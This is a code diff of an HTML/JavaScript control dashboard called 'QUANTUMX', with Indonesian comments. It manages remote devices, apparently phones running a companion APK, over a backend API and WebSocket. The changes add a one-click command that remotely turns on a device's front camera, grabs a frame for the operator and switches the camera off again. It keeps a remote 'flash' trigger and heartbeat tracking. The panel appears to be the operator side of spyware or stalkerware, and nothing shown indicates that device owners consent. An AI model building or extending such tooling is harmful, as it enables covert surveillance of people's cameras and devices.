@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>QUANTUMX • Dashboard</title>
     
-    <!-- Fonts Icons -->
+    <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <!-- Socket.io -->
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
@@ -455,7 +455,7 @@
             border-radius: 32px;
             width: 100%;
             max-width: 600px;
-            max-height: 80vh;
+            max-height: 85vh;
             overflow: hidden;
             animation: modalSlide 0.3s ease;
         }
@@ -500,7 +500,7 @@
         .modal-body {
             padding: 25px;
             overflow-y: auto;
-            max-height: calc(80vh - 80px);
+            max-height: calc(85vh - 80px);
         }
         
         .device-info-panel {
@@ -523,28 +523,82 @@
             min-width: 100px;
         }
         
-        /* FLASH CONTROL SECTION */
-        .flash-control-section {
+        /* COLLAPSIBLE SECTION */
+        .collapsible-section {
             background: var(--bg-tertiary);
             border: 1px solid var(--border-color);
             border-radius: 16px;
-            padding: 20px;
             margin-bottom: 20px;
+            overflow: hidden;
         }
         
-        .flash-title {
+        .section-header {
+            padding: 18px 20px;
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: var(--accent-primary);
-            font-weight: 600;
+            justify-content: space-between;
+            cursor: pointer;
+            user-select: none;
+            transition: background 0.2s;
         }
         
-        .flash-title i {
+        .section-header:hover {
+            background: rgba(255, 255, 255, 0.02);
+        }
+        
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .section-title i {
             font-size: 20px;
         }
         
+        .section-title.flash i {
+            color: var(--accent-primary);
+        }
+        
+        .section-title.camera i {
+            color: var(--info);
+        }
+        
+        .section-title span {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .section-arrow {
+            color: var(--text-secondary);
+            transition: transform 0.3s ease;
+        }
+        
+        .section-arrow.expanded {
+            transform: rotate(180deg);
+            color: var(--accent-primary);
+        }
+        
+        .section-content {
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            border-top: 1px solid transparent;
+        }
+        
+        .section-content.expanded {
+            max-height: 500px;
+            opacity: 1;
+            overflow: visible;
+            border-top-color: var(--border-color);
+        }
+        
+        .content-inner {
+            padding: 20px;
+        }
+        
+        /* FLASH CONTROL */
         .duration-input-group {
             display: flex;
             gap: 10px;
@@ -610,126 +664,6 @@
             background: linear-gradient(135deg, #666666 0%, #444444 100%);
         }
         
-        /* CAMERA PREVIEW SECTION */
-        .camera-preview-section {
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .camera-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: var(--info);
-            font-weight: 600;
-        }
-        
-        .camera-title i {
-            font-size: 20px;
-        }
-        
-        .preview-container {
-            background: #000;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            min-height: 200px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            border: 2px solid var(--border-color);
-            margin-bottom: 15px;
-        }
-        
-        .preview-container.active {
-            border-color: var(--success);
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-        }
-        
-        .preview-placeholder {
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-        
-        .preview-placeholder i {
-            font-size: 48px;
-            margin-bottom: 10px;
-            opacity: 0.5;
-        }
-        
-        .preview-image {
-            width: 100%;
-            max-height: 300px;
-            object-fit: contain;
-            border-radius: 8px;
-        }
-        
-        .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid var(--border-color);
-            border-top-color: var(--accent-primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .camera-controls {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-        }
-        
-        .btn-camera {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.3s;
-            flex: 1;
-        }
-        
-        .btn-start {
-            background: linear-gradient(135deg, var(--success) 0%, #00cc6a 100%);
-            color: var(--bg-primary);
-        }
-        
-        .btn-start:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 255, 136, 0.2);
-        }
-        
-        .btn-stop {
-            background: linear-gradient(135deg, var(--danger) 0%, #cc0000 100%);
-            color: white;
-        }
-        
-        .btn-stop:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.2);
-        }
-        
-        .btn-camera:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
         /* COOLDOWN ANIMATION */
         .cooldown-progress {
             position: absolute;
@@ -749,6 +683,92 @@
             margin-left: 5px;
             font-size: 12px;
             color: var(--warning);
+        }
+        
+        /* CAMERA PREVIEW */
+        .preview-container {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            aspect-ratio: 4/3;
+            margin-bottom: 15px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .preview-placeholder {
+            color: var(--text-secondary);
+            text-align: center;
+        }
+        
+        .preview-placeholder i {
+            font-size: 48px;
+            margin-bottom: 10px;
+            opacity: 0.5;
+        }
+        
+        .preview-placeholder p {
+            font-size: 14px;
+        }
+        
+        #camera-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        
+        .btn-capture {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--info) 0%, #1a4cff 100%);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+        }
+        
+        .btn-capture:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(51, 102, 255, 0.3);
+        }
+        
+        .btn-capture:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            background: linear-gradient(135deg, #666666 0%, #444444 100%);
+        }
+        
+        .btn-capture i {
+            font-size: 20px;
+        }
+        
+        .camera-status {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 10px;
+            text-align: center;
+        }
+        
+        .camera-status i {
+            margin-right: 5px;
+        }
+        
+        .camera-status.success {
+            color: var(--success);
+        }
+        
+        .camera-status.error {
+            color: var(--danger);
         }
         
         /* DELETE BUTTON */
@@ -874,6 +894,11 @@
             animation: spin 1s linear infinite;
         }
         
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .menu-toggle {
@@ -910,10 +935,6 @@
                 flex-direction: column;
             }
             
-            .camera-controls {
-                flex-direction: column;
-            }
-            
             .notification {
                 left: 20px;
                 right: 20px;
@@ -934,7 +955,7 @@
             <div class="logo-small">
                 <span class="logo-quantum">Q</span><span class="logo-x">X</span>
             </div>
-            <div class="version">v3.0</div>
+            <div class="version">v1.0</div>
         </div>
         
         <div class="sidebar-menu">
@@ -1069,58 +1090,67 @@
                     <p><strong>Status:</strong> <span id="info-status">-</span></p>
                 </div>
                 
-                <!-- FLASH CONTROL -->
-                <div class="flash-control-section">
-                    <div class="flash-title">
-                        <i class="fas fa-bolt"></i>
-                        <span>Flash Control</span>
+                <!-- FLASH SECTION (COLLAPSIBLE) -->
+                <div class="collapsible-section" id="flash-section">
+                    <div class="section-header" onclick="toggleSection('flash')">
+                        <div class="section-title flash">
+                            <i class="fas fa-bolt"></i>
+                            <span>Flash Control</span>
+                        </div>
+                        <i class="fas fa-chevron-down section-arrow" id="flash-arrow"></i>
                     </div>
-                    
-                    <div class="duration-input-group">
-                        <input type="number" id="flash-duration" min="1" max="60" value="2" placeholder="Duration (seconds)">
-                        <div style="position: relative; flex: 1; min-width: 150px;">
-                            <button class="btn-send" id="send-flash-btn" onclick="sendFlashCommand()">
-                                <i class="fas fa-paper-plane"></i>
-                                <span id="btn-text">Send Flash</span>
-                                <span id="cooldown-timer" class="cooldown-text"></span>
-                                <div id="cooldown-progress" class="cooldown-progress"></div>
-                            </button>
+                    <div class="section-content" id="flash-content">
+                        <div class="content-inner">
+                            <div class="duration-input-group">
+                                <input type="number" id="flash-duration" min="1" max="60" value="2" placeholder="Duration (seconds)">
+                                <div style="position: relative; flex: 1; min-width: 150px;">
+                                    <button class="btn-send" id="send-flash-btn" onclick="sendFlashCommand()">
+                                        <i class="fas fa-paper-plane"></i>
+                                        <span id="btn-text">Send Flash</span>
+                                        <span id="cooldown-timer" class="cooldown-text"></span>
+                                        <div id="cooldown-progress" class="cooldown-progress"></div>
+                                    </button>
+                                </div>
+                            </div>
+                            <small style="color: var(--text-secondary); display: block; margin-top: 5px;">
+                                <i class="fas fa-info-circle"></i> Enter duration 1-60 seconds
+                            </small>
                         </div>
                     </div>
-                    <small style="color: var(--text-secondary); display: block; margin-top: 5px;">
-                        <i class="fas fa-info-circle"></i> Enter duration 1-60 seconds
-                    </small>
                 </div>
                 
-                <!-- CAMERA PREVIEW SECTION -->
-                <div class="camera-preview-section">
-                    <div class="camera-title">
-                        <i class="fas fa-camera"></i>
-                        <span>Camera Preview</span>
-                    </div>
-                    
-                    <div class="preview-container" id="preview-container">
-                        <div class="preview-placeholder" id="preview-placeholder">
+                <!-- CAMERA SECTION (COLLAPSIBLE) - FITUR BARU -->
+                <div class="collapsible-section" id="camera-section">
+                    <div class="section-header" onclick="toggleSection('camera')">
+                        <div class="section-title camera">
                             <i class="fas fa-camera"></i>
-                            <p>Camera preview will appear here</p>
+                            <span>Front Camera Screenshot</span>
                         </div>
-                        <img class="preview-image" id="preview-image" style="display: none;">
-                        <div class="loading-spinner" id="camera-loading" style="display: none;"></div>
+                        <i class="fas fa-chevron-down section-arrow" id="camera-arrow"></i>
                     </div>
-                    
-                    <div class="camera-controls">
-                        <button class="btn-camera btn-start" id="start-camera-btn" onclick="startCameraPreview()" disabled>
-                            <i class="fas fa-play"></i>
-                            <span>Start</span>
-                        </button>
-                        <button class="btn-camera btn-stop" id="stop-camera-btn" onclick="stopCameraPreview()" disabled>
-                            <i class="fas fa-stop"></i>
-                            <span>Stop</span>
-                        </button>
+                    <div class="section-content" id="camera-content">
+                        <div class="content-inner">
+                            <!-- Preview Container -->
+                            <div class="preview-container">
+                                <div class="preview-placeholder" id="preview-placeholder">
+                                    <i class="fas fa-camera"></i>
+                                    <p>Preview akan muncul di sini</p>
+                                </div>
+                                <img id="camera-image" class="preview-image" alt="Camera preview">
+                            </div>
+                            
+                            <!-- AMBIL Button -->
+                            <button class="btn-capture" id="capture-btn" onclick="captureScreenshot()">
+                                <i class="fas fa-camera-retro"></i>
+                                AMBIL
+                            </button>
+                            
+                            <!-- Status -->
+                            <div class="camera-status" id="camera-status">
+                                <i class="fas fa-info-circle"></i> Klik AMBIL untuk mengambil screenshot kamera depan
+                            </div>
+                        </div>
                     </div>
-                    <small style="color: var(--text-secondary); display: block; margin-top: 5px; text-align: center;">
-                        <i class="fas fa-sync-alt"></i> Updates every 5 seconds
-                    </small>
                 </div>
                 
                 <!-- DELETE DEVICE BUTTON -->
@@ -1162,9 +1192,6 @@
         
         // Keep-alive interval
         let keepAliveInterval = null;
-        
-        // Camera preview variables
-        let isCameraActive = false;
         
         // ========== INIT ==========
         (function() {
@@ -1211,6 +1238,11 @@
             
             // Auto refresh stats
             setInterval(updateStats, 3000);
+            
+            // Set flash section terbuka default
+            setTimeout(() => {
+                toggleSection('flash');
+            }, 500);
         })();
         
         // ========== NOTIFICATION ==========
@@ -1237,11 +1269,20 @@
             
             setTimeout(() => {
                 hideNotification();
-            }, 2000);
+            }, 3000);
         }
         
         function hideNotification() {
             document.getElementById('notification').classList.remove('show');
+        }
+        
+        // ========== COLLAPSIBLE SECTION ==========
+        function toggleSection(section) {
+            const content = document.getElementById(section + '-content');
+            const arrow = document.getElementById(section + '-arrow');
+            
+            content.classList.toggle('expanded');
+            arrow.classList.toggle('expanded');
         }
         
         // ========== COOLDOWN FUNCTION ==========
@@ -1257,16 +1298,19 @@
             const cooldownProgress = document.getElementById('cooldown-progress');
             const durationInput = document.getElementById('flash-duration');
             
+            // Disable button and input
             sendBtn.disabled = true;
             sendBtn.classList.add('cooldown');
             durationInput.disabled = true;
             
+            // Update cooldown setiap 100ms
             cooldownInterval = setInterval(() => {
                 const now = Date.now();
                 const remaining = Math.max(0, cooldownEndTime - now);
                 const remainingSeconds = Math.ceil(remaining / 1000);
                 
                 if (remaining <= 0) {
+                    // Cooldown selesai
                     clearInterval(cooldownInterval);
                     isCooldown = false;
                     sendBtn.disabled = false;
@@ -1276,90 +1320,13 @@
                     cooldownTimer.textContent = '';
                     cooldownProgress.style.width = '0%';
                 } else {
+                    // Update tampilan
                     const progress = ((duration * 1000) - remaining) / (duration * 1000) * 100;
                     cooldownProgress.style.width = progress + '%';
                     btnText.textContent = 'Waiting';
                     cooldownTimer.textContent = `(${remainingSeconds}s)`;
                 }
             }, 100);
-        }
-        
-        // ========== CAMERA PREVIEW FUNCTIONS ==========
-        function startCameraPreview() {
-            if (!currentDevice) {
-                showNotification('No device selected', 'error');
-                return;
-            }
-            
-            if (isCameraActive) return;
-            
-            isCameraActive = true;
-            document.getElementById('start-camera-btn').disabled = true;
-            document.getElementById('stop-camera-btn').disabled = false;
-            document.getElementById('preview-container').classList.add('active');
-            
-            // Show loading
-            document.getElementById('preview-placeholder').style.display = 'none';
-            document.getElementById('preview-image').style.display = 'none';
-            document.getElementById('camera-loading').style.display = 'block';
-            
-            // Send start command to device (interval 5 detik)
-            fetch('/api/device/' + currentDevice.deviceId + '/command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': 'Bearer ' + token
-                },
-                body: JSON.stringify({ 
-                    command: 'camera_start',
-                    params: { interval: 5000 } // 5 detik
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) {
-                    showNotification('Camera preview started', 'success');
-                } else {
-                    showNotification('Failed to start camera', 'error');
-                    stopCameraPreview();
-                }
-            })
-            .catch(err => {
-                console.error('Start camera error:', err);
-                showNotification('Error starting camera', 'error');
-                stopCameraPreview();
-            });
-        }
-        
-        function stopCameraPreview() {
-            if (!isCameraActive) return;
-            
-            isCameraActive = false;
-            document.getElementById('start-camera-btn').disabled = false;
-            document.getElementById('stop-camera-btn').disabled = true;
-            document.getElementById('preview-container').classList.remove('active');
-            
-            // Hide image and show placeholder
-            document.getElementById('preview-placeholder').style.display = 'block';
-            document.getElementById('preview-image').style.display = 'none';
-            document.getElementById('camera-loading').style.display = 'none';
-            
-            // Send stop command to device
-            if (currentDevice) {
-                fetch('/api/device/' + currentDevice.deviceId + '/command', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer ' + token
-                    },
-                    body: JSON.stringify({ 
-                        command: 'camera_stop',
-                        params: {}
-                    })
-                }).catch(err => console.error('Stop camera error:', err));
-            }
-            
-            showNotification('Camera preview stopped', 'info');
         }
         
         // ========== WEBSOCKET ==========
@@ -1377,10 +1344,12 @@
                 });
                 
                 socket.on('connect', () => {
-                    console.log('✅ WebSocket connected');
+                    console.log('✅ WebSocket connected via:', socket.io.engine.transport.name);
                     updateConnectionStatus(true);
                     socket.emit('panel-connect', {});
                     showNotification('Connected to server', 'success');
+                    
+                    // Start keep-alive
                     startKeepAlive();
                 });
                 
@@ -1394,8 +1363,11 @@
                     updateConnectionStatus(false);
                     stopKeepAlive();
                     
+                    // Auto reconnect
                     if (reason === 'io server disconnect' || reason === 'transport close' || reason === 'ping timeout') {
-                        setTimeout(() => socket.connect(), 3000);
+                        setTimeout(() => {
+                            socket.connect();
+                        }, 3000);
                     }
                 });
                 
@@ -1405,14 +1377,19 @@
                     const deviceId = data.deviceId;
                     const isOnline = data.status === 'online';
                     
+                    // JIKA DEVICE ONLINE, HAPUS DARI DELETED DEVICES!
                     if (isOnline && deletedDevices.has(deviceId)) {
                         console.log('🔄 Device online, removing from deleted list:', deviceId);
                         deletedDevices.delete(deviceId);
                         localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
                     }
                     
-                    if (deletedDevices.has(deviceId)) return;
+                    if (deletedDevices.has(deviceId)) {
+                        console.log('🚫 Device ignored (deleted):', deviceId);
+                        return;
+                    }
                     
+                    // AMBIL DATA LAMA KALO ADA
                     const existingDevice = wsDevices.get(deviceId);
                     
                     wsDevices.set(deviceId, {
@@ -1435,6 +1412,7 @@
                     
                     const deviceId = data.deviceId;
                     
+                    // JIKA ADA HEARTBEAT, HAPUS DARI DELETED DEVICES!
                     if (deletedDevices.has(deviceId)) {
                         console.log('🔄 Heartbeat received, removing from deleted list:', deviceId);
                         deletedDevices.delete(deviceId);
@@ -1458,26 +1436,39 @@
                     updateStats();
                 });
                 
-                // Handle camera frame (otomatis dari APK, tanpa request)
+                // Handle camera frames
                 socket.on('camera-frame', (data) => {
                     console.log('📸 Camera frame received');
                     
-                    if (data.deviceId === currentDevice?.deviceId && isCameraActive) {
-                        const previewImg = document.getElementById('preview-image');
+                    if (currentDevice && data.deviceId === currentDevice.deviceId && data.imageData) {
+                        const cameraImage = document.getElementById('camera-image');
                         const placeholder = document.getElementById('preview-placeholder');
-                        const loading = document.getElementById('camera-loading');
+                        const status = document.getElementById('camera-status');
+                        const captureBtn = document.getElementById('capture-btn');
                         
-                        if (data.imageData) {
-                            previewImg.src = 'data:image/jpeg;base64,' + data.imageData;
-                            previewImg.style.display = 'block';
-                            placeholder.style.display = 'none';
-                            loading.style.display = 'none';
-                        }
+                        cameraImage.src = 'data:image/jpeg;base64,' + data.imageData;
+                        cameraImage.style.display = 'block';
+                        placeholder.style.display = 'none';
+                        
+                        status.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> Screenshot berhasil: ' + new Date().toLocaleTimeString();
+                        status.className = 'camera-status success';
+                        
+                        captureBtn.disabled = false;
+                        captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                        
+                        // Stop camera setelah screenshot
+                        fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Authorization': 'Bearer ' + token
+                            },
+                            body: JSON.stringify({ command: 'camera_stop' })
+                        }).catch(err => console.log('Stop camera error:', err));
                     }
                 });
                 
-                socket.on('pong', () => console.log('🏓 Pong received'));
-                
+                // Handle command results
                 socket.on('command-result', (data) => {
                     console.log('Command result:', data);
                     
@@ -1537,12 +1528,17 @@
         // ========== DEVICE MANAGEMENT ==========
         async function loadDevices() {
             try {
-                const response = await fetch('/api/devices', {
-                    headers: { 'Authorization': 'Bearer ' + token }
+                const response = await fetch(backendUrl + '/api/devices', {
+                    headers: {
+                        'Authorization': 'Bearer ' + token
+                    }
                 });
                 
                 if (!response.ok) {
-                    if (response.status === 401) logout();
+                    if (response.status === 401) {
+                        logout();
+                        return;
+                    }
                     throw new Error('Failed to load devices');
                 }
                 
@@ -1560,10 +1556,14 @@
         function mergeAndRenderDevices() {
             let allDevices = [];
             
+            // Prioritas: data dari WebSocket (lebih realtime)
             wsDevices.forEach((wsDevice, id) => {
-                if (!deletedDevices.has(id)) allDevices.push(wsDevice);
+                if (!deletedDevices.has(id)) {
+                    allDevices.push(wsDevice);
+                }
             });
             
+            // Tambah dari API yang belum ada di WebSocket
             devices.forEach(d => {
                 if (!deletedDevices.has(d.deviceId) && !allDevices.find(dev => dev.deviceId === d.deviceId)) {
                     allDevices.push(d);
@@ -1686,11 +1686,6 @@
         
         // ========== MODAL ==========
         function openDeviceModal(device) {
-            // Stop camera if active
-            if (isCameraActive) {
-                stopCameraPreview();
-            }
-            
             currentDevice = device;
             
             document.getElementById('modal-device-name').textContent = device.deviceName || device.deviceId;
@@ -1706,43 +1701,134 @@
             const isOnline = device.online && diffMinutes < 5;
             document.getElementById('info-status').textContent = isOnline ? 'Online' : 'Offline';
             
-            // Reset flash
+            // Reset camera preview
+            resetCameraPreview();
+            
             document.getElementById('flash-duration').value = 2;
             document.getElementById('flash-duration').disabled = false;
-            
-            // Reset camera buttons
-            document.getElementById('start-camera-btn').disabled = false;
-            document.getElementById('stop-camera-btn').disabled = true;
-            
-            // Reset preview
-            document.getElementById('preview-placeholder').style.display = 'block';
-            document.getElementById('preview-image').style.display = 'none';
-            document.getElementById('camera-loading').style.display = 'none';
-            document.getElementById('preview-container').classList.remove('active');
-            
             document.getElementById('device-modal').classList.add('active');
+            
+            // Tutup semua section saat buka modal
+            document.getElementById('flash-content').classList.remove('expanded');
+            document.getElementById('flash-arrow').classList.remove('expanded');
+            document.getElementById('camera-content').classList.remove('expanded');
+            document.getElementById('camera-arrow').classList.remove('expanded');
         }
         
         function closeModal() {
-            // Stop camera if active
-            if (isCameraActive) {
-                stopCameraPreview();
-            }
-            
             document.getElementById('device-modal').classList.remove('active');
             currentDevice = null;
+        }
+        
+        // ========== CAMERA FUNCTIONS ==========
+        function resetCameraPreview() {
+            const cameraImage = document.getElementById('camera-image');
+            const placeholder = document.getElementById('preview-placeholder');
+            const status = document.getElementById('camera-status');
+            
+            cameraImage.style.display = 'none';
+            cameraImage.src = '';
+            placeholder.style.display = 'block';
+            status.innerHTML = '<i class="fas fa-info-circle"></i> Klik AMBIL untuk mengambil screenshot kamera depan';
+            status.className = 'camera-status';
+        }
+        
+        async function captureScreenshot() {
+            if (!currentDevice) {
+                showNotification('No device selected', 'error');
+                return;
+            }
+            
+            const captureBtn = document.getElementById('capture-btn');
+            captureBtn.disabled = true;
+            captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengambil...';
+            
+            try {
+                // Send camera_start command
+                const startResponse = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + token
+                    },
+                    body: JSON.stringify({ 
+                        command: 'camera_start',
+                        params: { camera: 'front' }
+                    })
+                });
+                
+                const startData = await startResponse.json();
+                
+                if (startData.success) {
+                    // Tunggu sebentar untuk camera ready
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                    // Send frame request
+                    await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer ' + token
+                        },
+                        body: JSON.stringify({ 
+                            command: 'camera_frame',
+                            params: {}
+                        })
+                    });
+                    
+                    showNotification('📸 Mengambil screenshot...', 'info');
+                    
+                    // Timeout 5 detik
+                    setTimeout(() => {
+                        if (captureBtn.disabled) {
+                            captureBtn.disabled = false;
+                            captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                            
+                            // Stop camera
+                            fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                    'Authorization': 'Bearer ' + token
+                                },
+                                body: JSON.stringify({ command: 'camera_stop' })
+                            }).catch(err => console.log('Stop camera error:', err));
+                            
+                            showNotification('❌ Timeout: No frame received', 'error');
+                        }
+                    }, 5000);
+                    
+                } else {
+                    captureBtn.disabled = false;
+                    captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                    showNotification('❌ Failed to start camera', 'error');
+                }
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+                
+                // Try to stop camera
+                try {
+                    await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': 'Bearer ' + token
+                        },
+                        body: JSON.stringify({ command: 'camera_stop' })
+                    });
+                } catch (e) {}
+                
+                captureBtn.disabled = false;
+                captureBtn.innerHTML = '<i class="fas fa-camera-retro"></i> AMBIL';
+                showNotification('❌ Error: ' + error.message, 'error');
+            }
         }
         
         // ========== FLASH COMMAND ==========
         async function sendFlashCommand() {
             if (!currentDevice) {
                 showNotification('No device selected', 'error');
-                return;
-            }
-            
-            // CEK APAKAH CAMERA SEDANG AKTIF
-            if (isCameraActive) {
-                showNotification('Please stop camera preview first', 'warning');
                 return;
             }
             
@@ -1759,7 +1845,7 @@
             }
             
             try {
-                const response = await fetch('/api/device/' + currentDevice.deviceId + '/command', {
+                const response = await fetch(backendUrl + '/api/device/' + currentDevice.deviceId + '/command', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1810,6 +1896,7 @@
                 deletedDevices.add(currentDevice.deviceId);
                 localStorage.setItem('quantumx_deleted_devices', JSON.stringify(Array.from(deletedDevices)));
                 
+                // Hapus dari semua storage
                 const index = devices.findIndex(d => d.deviceId === currentDevice.deviceId);
                 if (index !== -1) devices.splice(index, 1);
                 
@@ -1835,13 +1922,20 @@
         }
         
         function switchTab(tabName, element) {
-            document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
+            document.querySelectorAll('.menu-item').forEach(item => {
+                item.classList.remove('active');
+            });
             element.classList.add('active');
             
-            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
+            });
             document.getElementById(tabName + '-tab').style.display = 'block';
             
-            const titles = { devices: 'Devices', settings: 'Settings' };
+            const titles = {
+                devices: 'Devices',
+                settings: 'Settings'
+            };
             document.getElementById('page-title').textContent = titles[tabName];
             
             if (window.innerWidth <= 768) {
@@ -1857,7 +1951,6 @@
         
         function logout() {
             stopKeepAlive();
-            if (isCameraActive) stopCameraPreview();
             if (socket) socket.disconnect();
             localStorage.removeItem('quantumx_token');
             localStorage.removeItem('quantumx_user');
@@ -1866,13 +1959,16 @@
         
         document.addEventListener('click', function(e) {
             const modal = document.getElementById('device-modal');
-            if (e.target === modal) closeModal();
+            if (e.target === modal) {
+                closeModal();
+            }
         });
         
         document.getElementById('flash-duration')?.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && !isCooldown) sendFlashCommand();
+            if (e.key === 'Enter' && !isCooldown) {
+                sendFlashCommand();
+            }
         });
     </script>
 </body>
 </html>
-
